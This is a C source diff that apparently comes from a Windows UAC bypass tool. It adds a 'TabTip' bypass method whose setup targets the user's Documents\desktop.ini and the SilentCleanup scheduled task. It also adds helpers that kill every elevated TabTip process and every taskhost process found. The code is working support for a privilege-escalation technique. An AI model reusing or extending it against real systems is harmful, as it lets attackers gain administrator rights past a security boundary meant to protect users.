@@ -787,6 +787,51 @@ void supCopyMemory(
 }
 
 /*
+* supQueryEnvironmentVariable
+*
+* Purpose:
+*
+* Query environment variable.
+*
+*/
+_Success_(return != FALSE)
+BOOL supQueryEnvironmentVariable(
+    _In_ LPCWSTR Name,
+    _Out_ LPWSTR Buffer,
+    _In_ ULONG BufferLength
+)
+{
+    NTSTATUS ntStatus;
+    UNICODE_STRING usName;
+    UNICODE_STRING usValue;
+
+    if (Name == NULL || Buffer == NULL || BufferLength == 0)
+        return FALSE;
+
+    RtlSecureZeroMemory(Buffer, BufferLength * sizeof(WCHAR));
+
+    ntStatus = RtlInitUnicodeStringEx(&usName, Name);
+    if (!NT_SUCCESS(ntStatus))
+        return FALSE;
+
+    usValue.Buffer = Buffer;
+    usValue.Length = 0;
+    usValue.MaximumLength = (USHORT)(BufferLength * sizeof(WCHAR));
+
+    ntStatus = RtlQueryEnvironmentVariable_U(
+        NULL,
+        &usName,
+        &usValue);
+
+    if (!NT_SUCCESS(ntStatus))
+        return FALSE;
+
+    Buffer[usValue.Length / sizeof(WCHAR)] = 0;
+
+    return TRUE;
+}
+
+/*
 * supQueryEnvironmentVariableOffset
 *
 * Purpose:
@@ -2284,6 +2329,17 @@ VOID supSetMethodSpecificDataToParametersBlock(
     case UacMethodQuickAssist:
         _strcpy(ParamBlock->szOptionalParameter1, TEXT("\\System32\\WiFiCloudStore.dll"));
         _strcpy(ParamBlock->szOptionalParameter2, TEXT("\\Microsoft\\Windows\\WlanSvc\\CDSSync"));
+        break;
+
+    case UacMethodTabTip:
+        if (supQueryEnvironmentVariable(
+            L"USERPROFILE",
+            ParamBlock->szOptionalParameter1,
+            RTL_NUMBER_OF(ParamBlock->szOptionalParameter1)))
+        {
+            _strcat(ParamBlock->szOptionalParameter1, L"\\Documents\\desktop.ini");
+            _strcpy(ParamBlock->szOptionalParameter2, L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
+        }
         break;
 
     default:
@@ -4512,6 +4568,95 @@ BOOL supxExamineTaskhost(
 }
 
 /*
+* supIsProcessElevated
+*
+* Purpose:
+*
+* Check if process token has elevated flag set.
+*
+*/
+BOOL supIsProcessElevated(
+    _In_ HANDLE ProcessHandle
+)
+{
+    BOOL bResult = FALSE;
+    HANDLE tokenHandle = NULL;
+    TOKEN_ELEVATION tokenInfo;
+    ULONG returnLength = 0;
+
+    if (ProcessHandle == NULL) {
+        return FALSE;
+    }
+
+    if (!NT_SUCCESS(NtOpenProcessToken(
+        ProcessHandle,
+        TOKEN_QUERY,
+        &tokenHandle)))
+    {
+        return FALSE;
+    }
+
+    tokenInfo.TokenIsElevated = 0;
+
+    if (NT_SUCCESS(NtQueryInformationToken(
+        tokenHandle,
+        TokenElevation,
+        &tokenInfo,
+        sizeof(tokenInfo),
+        &returnLength)))
+    {
+        bResult = (tokenInfo.TokenIsElevated != 0);
+    }
+
+    NtClose(tokenHandle);
+
+    return bResult;
+}
+
+/*
+* supxTerminateProcess
+*
+* Purpose:
+*
+* Terminate process by PID.
+*
+*/
+BOOL supxTerminateProcess(
+    _In_ HANDLE UniqueProcessId,
+    _In_ BOOL ElevatedOnly
+)
+{
+    BOOL bResult = FALSE;
+    NTSTATUS status;
+    HANDLE processHandle = NULL;
+    CLIENT_ID cid;
+    OBJECT_ATTRIBUTES obja;
+
+    cid.UniqueProcess = UniqueProcessId;
+    cid.UniqueThread = NULL;
+
+    InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
+    if (NT_SUCCESS(NtOpenProcess(&processHandle,
+        MAXIMUM_ALLOWED,
+        &obja,
+        &cid)))
+    {
+        if (ElevatedOnly) {
+            if (!supIsProcessElevated(processHandle)) {
+                NtClose(processHandle);
+                return FALSE;
+            }
+        }
+
+        NtTerminateProcess(processHandle, 0);
+        NtClose(processHandle);
+        return TRUE;
+    }
+
+    return FALSE;
+}
+
+/*
 * supEnumTaskhostTasksCallback
 *
 * Purpose:
@@ -4530,7 +4675,33 @@ BOOL CALLBACK supEnumTaskhostTasksCallback(
         return FALSE;
 
     supxExamineTaskhost(ProcessEntry->UniqueProcessId);
+    supxTerminateProcess(ProcessEntry->UniqueProcessId, FALSE);
 
+    return FALSE;
+}
+
+/*
+* supTerminateTabTipCallback
+*
+* Purpose:
+*
+* Callback for tabtip process termination.
+*
+*/
+BOOL CALLBACK supTerminateTabTipCallback(
+    _In_ PSYSTEM_PROCESS_INFORMATION ProcessEntry,
+    _In_ PVOID UserContext
+)
+{
+    PUNICODE_STRING targetProcess = (PUNICODE_STRING)UserContext;
+
+    if (!RtlEqualUnicodeString(&ProcessEntry->ImageName, targetProcess, TRUE))
+        return FALSE;
+
+    //
+    // Kill all elevated instances.
+    //
+    supxTerminateProcess(ProcessEntry->UniqueProcessId, TRUE);
     return FALSE;
 }
 
